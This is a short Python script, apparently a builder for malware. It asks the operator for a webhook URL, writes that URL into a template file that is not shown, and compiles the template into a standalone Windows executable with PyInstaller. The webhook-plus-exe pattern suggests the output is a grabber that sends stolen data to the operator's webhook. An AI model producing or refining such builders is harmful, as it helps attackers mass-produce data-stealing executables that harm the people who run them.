import os
print("""
                     ██╗░░██╗███████╗░██████╗░██████╗██╗
                     ██║░░██║██╔════╝██╔════╝██╔════╝██║
                     ███████║█████╗░░╚█████╗░╚█████╗░██║
                     ██╔══██║██╔══╝░░░╚═══██╗░╚═══██╗██║
                     ██║░░██║███████╗██████╔╝██████╔╝██║
                     ╚═╝░░╚═╝╚══════╝╚═════╝░╚═════╝░╚═╝
                                   """)
webhook = ("WEBHOOK_URL = " + "'" + input("Enter your webhook url: ") + "'" )
my_file = "database.py"
base = os.path.splitext(my_file)[0]

if os.path.exists("database.py"):
  os.rename(my_file, base + '.ini')

if os.path.exists("file.py"):
  os.remove("file.py")

if os.path.exists("output/file.exe"):
  os.remove("output/file.exe")

my_file = 'database.ini'
base = os.path.splitext(my_file)[0]
os.rename(my_file, base + '.py')

import shutil
shutil.copy('database.py', 'file.py')


my_file = 'database.py'
base = os.path.splitext(my_file)[0]
os.rename(my_file, base + '.ini')



a_file = open("file.py", "r")
list_of_lines = a_file.readlines()
list_of_lines[7] = webhook

a_file = open("file.py", "w")
a_file.writelines(list_of_lines)
a_file.close()


os.system('cmd /k "pyinstaller file.py --onefile --distpath output"')

